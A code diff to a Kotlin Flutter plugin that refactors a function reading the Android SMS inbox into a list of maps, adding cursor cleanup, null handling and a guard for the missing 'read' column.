@@ -169,39 +169,36 @@ class SpluginPlugin: FlutterPlugin, MethodCallHandler,LocationListener, Activity
   // 定义一个用于读取短信并返回包含短信信息的Map列表的函数
   @SuppressLint("Range")
   private fun getSmList(): List<Map<String, Any>> {
-    // 创建一个空的列表，用于存储短信信息
     val smsList = mutableListOf<Map<String, Any>>()
-    // 获取内容解析器
     val cr = context.contentResolver
-    // 定义要查询的列
     val projection = arrayOf("_id", "address", "person", "body", "date", "type")
-    // 定义查询URI
     val SMS_INBOX = Uri.parse("content://sms/inbox")
-    // 执行查询
-    val cur: Cursor? = cr.query(SMS_INBOX, projection, null, null, null)
-    // 检查查询结果是否为空
-    if (cur != null) {
-      // 遍历查询结果
-      while (cur.moveToNext()) {
-        // 创建映射以存储每条短信的信息
-        val map = hashMapOf<String, Any>()
-        // 获取短信详情
-        map["id"] = cur.getLong(cur.getColumnIndex("_id"))
-        map["address"] = cur.getString(cur.getColumnIndex("address")) // 手机号
-        map["person"] = cur.getString(cur.getColumnIndex("person")) // 联系人姓名
-        map["body"] = cur.getString(cur.getColumnIndex("body")) // 短信内容
-        map["date"] = cur.getLong(cur.getColumnIndex("date")) // 日期
-        map["type"] = cur.getInt(cur.getColumnIndex("type")) // 类型
-        map["read"] = cur.getInt(cur.getColumnIndex("read")) // 已读状态
-        // 将映射添加到列表中
-        smsList.add(map)
+
+    cr.query(SMS_INBOX, projection, null, null, null)?.use { cur ->
+      if (cur.moveToFirst()) { // Ensure cursor has at least one row of data
+        do {
+          val map = hashMapOf<String, Any>().apply {
+            put("id", cur.getLong(cur.getColumnIndexOrThrow("_id")))
+            put("address", cur.getString(cur.getColumnIndexOrThrow("address")) ?: "")
+            val personIndex = cur.getColumnIndexOrThrow("person")
+            put("person", if (cur.isNull(personIndex)) "" else cur.getString(personIndex))
+            put("body", cur.getString(cur.getColumnIndexOrThrow("body")) ?: "")
+            put("date", cur.getLong(cur.getColumnIndexOrThrow("date")))
+            put("type", cur.getInt(cur.getColumnIndexOrThrow("type")))
+
+            // Check if the "read" column exists
+            val readIndex = cur.getColumnIndex("read")
+            if (readIndex != -1) {
+              put("read", cur.getInt(readIndex))
+            }
+          }
+          smsList.add(map)
+        } while (cur.moveToNext())
       }
-      // 关闭游标
-      cur.close()
     }
-    // 返回包含短信信息的Map列表
     return smsList
   }
+
 
   @SuppressLint("Range")
   private fun getCallLogList(): List<Map<String, Any>> {
